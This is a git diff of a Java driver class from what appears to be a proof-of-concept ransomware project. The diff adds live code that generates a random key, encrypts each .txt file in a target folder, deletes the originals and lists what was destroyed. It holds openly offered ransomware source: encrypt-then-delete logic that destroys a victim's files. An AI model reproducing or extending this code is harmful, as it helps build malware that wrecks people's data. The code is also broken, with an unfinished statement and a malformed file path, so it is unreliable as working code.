@@ -1,25 +1,37 @@
 package ransomware;
 
+import java.io.File;
+import java.security.NoSuchAlgorithmException;
+import java.util.ArrayList;
+
 import ransomware.exceptions.CryptoException;
 
-import java.io.File;
-
 public class UtilsDriver {
-    public static void main(String[] args) {
-        String key = "1234567890QWERTYUIOPASDFGHJKLZXC";
-        //File inputFile = new File("testJavaFile.java");
-        //File encryptedFile = new File("testJavaFile.encrypted");
-        //File decryptedFile = new File("testJavaFile.decrypted");
+    private static String key = "";
 
-        File folder = new File("./testfiles/");
-        File[] files = folder.listFiles();
-        
-        for (File inputFile : files) {
-            System.out.println(inputFile.getName());
+    public static void main(String[] args) throws NoSuchAlgorithmException {
+        String folderPath = "D:/Coding/POC-Ransomware/src/main/java/ransomware/testfiles/";
+        File folder = new File(folderPath);
+        ArrayList<File> files = new ArrayList<>(0);
+        ArrayList<String> deletedFiles = new ArrayList<>(0);
+        File[] fileArray = folder.listFiles();
+        String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890`~!@#$%^&*()_+-={}|[];'/.,:?><";
+
+        for (int i = 0; i < 32; i++) {
+            key += Character.toString(alphabet.charAt((int) (Math.random() * alphabet.length())));
         }
-        /*for (File inputFile : files) {
-            File encryptedFile = new File(inputFile.getName() + ".encrypted");
-            File decryptedFile = new File(inputFile.getName() + ".decrypted");
+
+        System.out.println(key);
+        
+        for (File file : fileArray) {
+            if (file.getName().contains(".txt")) {
+                files.add(file);
+            }
+        }
+
+        for (File inputFile : files) {
+            File encryptedFile = new File(folderPath + inputFile.getName() + ".encrypted");
+            File decryptedFile = new File(folderPath + inputFile.getName() + ".decrypted");
             try {
                 Utils.encrypt(key, inputFile, encryptedFile);
                 Utils.decrypt(key, encryptedFile, decryptedFile);
@@ -27,6 +39,16 @@ public class UtilsDriver {
                 System.out.println(ex.getMessage());
                 ex.printStackTrace();
             }
-        }*/
+
+            deletedFiles.add(inputFile.getName());
+            inputFile.delete();
+        }
+
+        File encryptedFileList = new File(folderPath + "D:/Coding/POC-Ransomware/src/main/java/ransomware/encryptedFiles.list");
+
+        for (String fileName : deletedFiles) {
+            encryptedFileList.
+            System.out.println("Encrypted and deleted file: " + fileName);
+        }
     }
 }
